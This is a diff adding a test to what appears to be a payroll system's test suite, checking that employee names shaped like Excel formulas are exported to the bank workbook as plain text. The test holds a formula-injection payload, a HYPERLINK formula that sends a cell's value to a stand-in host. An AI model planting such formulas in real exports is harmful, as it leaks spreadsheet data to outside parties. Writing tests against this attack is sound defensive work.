@@ -548,3 +548,14 @@ def test_the_net_is_never_negative():
     c = _compute(_P(), _S(late=Decimal("290")), dues=[runs.Due(_D(), Decimal("100"))])
     assert c.cells["advance"] == Decimal("10.000") and c.net == Decimal("0.000")  # only what was left
     assert c.cells["carried"] == Decimal("90.000") and "net_negative" not in c.flags
+
+
+def test_a_name_that_looks_like_a_formula_stays_text_in_the_bank_file(admin_client, company, platforms):
+    """The bank's file must not run anything a name or a note carries (Excel formula injection)."""
+    set_cap(admin_client)
+    evil = '=HYPERLINK("http://x.example/?"&A1,"open")'
+    make_employee(admin_client, company["id"], basic_salary="400.000", name={"ar": evil, "en": evil})
+    run = admin_client.post(f"{P}/runs", json={"company_id": company["id"], "month": MONTH.isoformat()}).json()
+    wb = openpyxl.load_workbook(io.BytesIO(admin_client.get(f"{P}/runs/{run['id']}/export").content))
+    cells = [c for ws in wb for row in ws.iter_rows(min_row=2) for c in row if c.value == evil]
+    assert cells and all(c.data_type == "s" for c in cells)
